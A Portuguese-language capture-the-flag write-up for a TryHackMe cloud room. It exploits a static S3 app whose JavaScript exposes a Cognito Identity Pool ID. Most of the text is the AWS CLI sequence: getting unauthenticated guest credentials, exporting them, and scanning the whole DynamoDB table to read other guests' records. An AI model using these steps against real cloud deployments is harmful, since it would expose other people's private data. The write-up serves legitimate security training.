# TryHackMe — The Concierge Knows Too Much (Hacker Holidays: The Byte Lotus)

**Plataforma:** TryHackMe
**Evento:** Hacker Holidays — The Byte Lotus Hotel
**Dificuldade:** MEDIUM
**Categoria:** Cloud / AWS Misconfiguration (Cognito + DynamoDB)
**Target:** http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/

## Briefing

> "Lambo installed the Byte Lotus Wellness app the day she arrived — it was free, it had great reviews (written by the app, but she didn't check), and it got her a tote bag for saying yes to camera, mic, contacts, and location access. No account needed. No login screen. It just... knows things about you the moment you open it."
>
> "That's the whole pitch: 'complimentary' access, no friction, no sign-up. Something still has to be deciding what you're allowed to see, even without a login — and whatever that something is, it isn't checking very carefully."

**Objetivo:** descobrir como o app sabe informações sobre o usuário sem login, e o que mais ele está disposto a entregar.

**Itinerário da room:**
- Rastrear o mecanismo da AWS que emite credenciais nos bastidores
- Usar essas credenciais pra extrair mais do que o próprio registro na tabela DynamoDB do app
- Recuperar a flag a partir dos dados de outro guest

## Reconhecimento (Recon)

O alvo é um site estático hospedado em um bucket S3 (`s3-website-us-east-1.amazonaws.com`), então a abordagem aqui é diferente de uma aplicação com backend tradicional — é tudo client-side.

Baixei a página principal para inspecionar o código-fonte:

```
curl http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/ -o index.html
cat index.html
```

O HTML referenciava o AWS SDK e um arquivo JS local próprio da aplicação, que baixei em seguida:

```
curl http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/<app.js> -o app.js
cat app.js
```

## Descoberta da vulnerabilidade

O JavaScript da aplicação revelou, hardcoded, um **AWS Cognito Identity Pool ID** configurado para emitir **credenciais não autenticadas (guest)** a qualquer visitante, sem exigir login:

```javascript
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";

AWS.config.credentials = new AWS.CognitoIdentityCredentials({
IdentityPoolId: IDENTITY_POOL_ID,
});
```

O app usa um `guest_id` gerado no `localStorage` do navegador (sem autenticação real) para buscar dados na tabela DynamoDB `complimentary-GuestWellnessProfiles` via `getItem`. O problema: **nada impede que as credenciais temporárias do Cognito sejam usadas para um `scan` completo da tabela**, em vez de buscar só o próprio item a política de IAM associada ao papel "unauthenticated" do Identity Pool está permissiva demais.

## Exploração

**1. Obter um Identity ID a partir do pool exposto:**
```
aws cognito-identity get-id \
--identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688 \
--region us-east-1 \
--no-sign-request
```

**2. Trocar o Identity ID por credenciais temporárias da AWS:**
```
aws cognito-identity get-credentials-for-identity \
--identity-id <us-east-1:836c0949-292d-485b-b532-52d5ca7bb688> \
--region us-east-1 \
--no-sign-request
```

**3. Exportar as credenciais retornadas (AccessKeyId, SecretKey, SessionToken):**
    Esqueci de guardar as credenciais que foram retornadas logo após pegar o *identity-id*, por isso coloquei *"valor"* ao  retratar do código em questão.
```
export AWS_ACCESS_KEY_ID="<valor>"
export AWS_SECRET_ACCESS_KEY="<valor>"
export AWS_SESSION_TOKEN="<valor>"
```

**4. Confirmar a identidade autenticada:**
```
aws sts get-caller-identity
```

**5. Realizar um scan completo na tabela DynamoDB (não apenas o próprio guest):**
nessa parte tive que recorrer a inteligência artificial(AI) para me ajudar.
```
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --region us-east-1
```

O scan retornou registros de múltiplos guests na tabela, incluindo dados que não pertenciam à identidade autenticada usada confirmando o controle de acesso quebrado.

## Flag / Resultado

A flag foi encontrada no registro de outro guest, retornado pelo `scan` da tabela.